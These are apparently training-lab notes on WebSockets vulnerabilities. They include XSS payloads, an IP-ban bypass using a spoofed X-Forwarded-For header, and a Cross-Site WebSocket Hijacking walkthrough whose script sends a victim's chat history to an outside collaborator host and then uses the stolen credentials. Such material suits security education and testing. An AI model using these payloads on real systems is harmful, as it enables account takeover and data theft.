## Manipulating WebSocket traffic

Finding WebSockets security vulnerabilities generally involves manipulating them in ways that the application doesn't expect. You can do this using Burp Suite.

You can use Burp Suite to:

-   [Intercept and modify WebSocket messages.](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
-   [Replay and generate new WebSocket messages.](https://portswigger.net/web-security/websockets#replaying-and-generating-new-websocket-messages)
-   [Manipulate WebSocket connections.](https://portswigger.net/web-security/websockets#manipulating-websocket-connections)

## WebSockets security vulnerabilities

In principle, practically any web security vulnerability might arise in relation to WebSockets:

-   User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as [SQL injection](https://portswigger.net/web-security/sql-injection) or XML external entity injection.
-   Some blind vulnerabilities reached via WebSockets might only be detectable using [out-of-band (OAST) techniques](https://portswigger.net/blog/oast-out-of-band-application-security-testing).
-   If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to [XSS](https://portswigger.net/web-security/cross-site-scripting) or other client-side vulnerabilities.

### Manipulating WebSocket messages to exploit vulnerabilities

The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by [tampering with the contents of WebSocket messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages).

For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:

`{"message":"Hello Carlos"}`

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

`<td>Hello Carlos</td>`

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

`{"message":"<img src=1 onerror='alert(1)'>"}`


### Bypassing XSS and IP restrictions

1.  Click "Live chat" and send a chat message.
2.  In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
3.  Right-click on the message and select "Send to Repeater".
4.  Edit and resend the message containing a basic XSS payload, such as:
    
    `<img src=1 onerror='alert(1)'>`
5.  Observe that the attack has been blocked, and that your WebSocket connection has been terminated.
6.  Click "Reconnect", and observe that the connection attempt fails because your IP address has been banned.
7.  Add the following header to the handshake request to spoof your IP address:
    
    `X-Forwarded-For: 1.1.1.1`
8.  Click "Connect" to successfully reconnect the WebSocket.
9.  Send a WebSocket message containing an obfuscated XSS payload, such as:
    
    ``<img src=1 oNeRrOr=alert`1`>``

### Cross-Site WebSocket Hijacking

1.  Click "Live chat" and send a chat message.
2.  Reload the page.
3.  In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4.  In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no [CSRF](https://portswigger.net/web-security/csrf) tokens.
5.  Right-click on the handshake request and select "Copy URL".
6.  In the browser, go to the exploit server and paste the following template into the "Body" section:
    
    `<script> var ws = new WebSocket('wss://your-websocket-url'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`
7.  Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator).
8.  Click "View exploit".
9.  Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
10.  Go back to the exploit server and deliver the exploit to the victim.
11.  Poll for interactions in the Collaborator tab again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
12.  Use the exfiltrated credentials to log in to the victim user's account.